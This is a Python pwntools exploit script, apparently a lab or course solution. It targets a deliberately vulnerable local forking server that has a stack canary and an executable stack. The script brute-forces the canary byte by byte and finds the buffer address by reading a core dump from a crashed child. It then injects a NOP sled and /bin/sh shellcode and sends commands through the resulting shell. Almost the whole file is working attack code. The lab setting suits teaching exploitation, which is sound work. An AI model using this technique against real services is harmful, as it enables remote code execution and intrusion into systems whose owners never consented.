#!/usr/bin/env python3
"""Solution for Problem 7: canary_server, canary ON + executable stack -> CODE INJECTION.

Same forking server, built with `-fstack-protector-all -z execstack`
(binary: canary_server_x). Now there IS a canary, but the stack is executable,
so once we defeat the canary we can inject shellcode onto the stack -- the
thing Problem 8 (canary + NX) cannot do.

Three steps:
  1. Offset: grow an all-'A' fill until "OK" disappears -> buf -> canary distance.
  2. Canary: recover the 4 bytes one at a time (a correct prefix still returns
     "OK"; a wrong byte trips __stack_chk_fail). Same idea as Problem 7.
  3. Address: there is no leak, so crash one child with a cyclic pattern and
     read buf's address out of the core dump it drops (the Morris trick from
     Problem 2). ASLR is off, so every forked child shares that address.

Then inject: fill buf with [NOP sled][shellcode], keep the real canary, and set
the return address to buf so it lands in the sled and slides into the shellcode.

Requires core dumps in the server's working directory (the VM sets
`kernel.core_pattern = core.%p`). Start the server first (from example3):
    ./canary_server_x &           # 127.0.0.1:4004
Then run:
    python3 solution3/solve_csrv_inject.py
"""
import os
import glob
import time
from pwn import *

context.update(arch="i386", os="linux", log_level="warn")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "canary_server_x")
CWD = os.path.join(HERE, "..")            # where the server drops core.<pid>
HOST, PORT = "127.0.0.1", 4004


def survives(payload):
    """Send payload on a fresh connection; True if the child returned ('OK')."""
    io = remote(HOST, PORT)
    io.send(payload)
    try:
        data = io.recvall(timeout=1)
    except EOFError:
        data = b""
    io.close()
    return b"OK" in data


def find_offset():
    """Largest all-'A' fill that still returns OK == distance buf -> canary."""
    n = 1
    while survives(b"A" * n):
        n += 1
    off = n - 1
    log.warn("offset(buf -> canary) = %d", off)
    return off


def leak_canary(offset):
    """Recover the 4 canary bytes; a correct prefix leaves the canary intact."""
    canary = b""
    while len(canary) < 4:
        for b in range(256):
            if survives(b"A" * offset + canary + bytes([b])):
                canary += bytes([b])
                break
        else:
            log.error("canary byte %d not found", len(canary))
    log.warn("canary = %s", canary.hex())
    return canary


def clean_cores():
    for f in glob.glob(os.path.join(CWD, "core*")):
        try:
            os.remove(f)
        except OSError:
            pass


def find_buf_addr(offset):
    """Crash one child with a cyclic pattern in buf, then read buf's address
    from the core dump (no leak available -- the Morris trick)."""
    clean_cores()
    io = remote(HOST, PORT)
    io.send(cyclic(offset + 16))           # overwrite past the canary -> abort -> core
    try:
        io.recvall(timeout=1)
    except EOFError:
        pass
    io.close()

    core = None
    for _ in range(50):                    # wait for the kernel to write the core
        cores = glob.glob(os.path.join(CWD, "core*"))
        if cores:
            try:
                core = Corefile(max(cores, key=os.path.getmtime))
                break
            except Exception:
                core = None
        time.sleep(0.1)
    if core is None:
        log.error("no core dump found -- enable cores (ulimit -c unlimited; "
                  "kernel.core_pattern = core.%p)")
    buf_addr = next(core.search(cyclic(8)))   # first pattern bytes live at buf start
    log.warn("buf @ %#x", buf_addr)
    return buf_addr


def main():
    offset = find_offset()                 # buf -> canary (expect 64)
    canary = leak_canary(offset)
    buf_addr = find_buf_addr(offset)

    shellcode = asm(shellcraft.sh())       # execve("/bin/sh", 0, 0)
    assert len(shellcode) <= offset, "shellcode larger than the buffer"
    # buf = [NOP sled][shellcode] | real canary | saved ebp | return addr = buf
    payload = b"\x90" * (offset - len(shellcode)) + shellcode
    payload += canary + b"B" * 4 + p32(buf_addr)

    io = remote(HOST, PORT)
    io.send(payload)
    log.success("canary bypassed + shellcode injected on the executable stack")
    io.sendline(b"id; uname -a; echo CANARY_INJECT_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
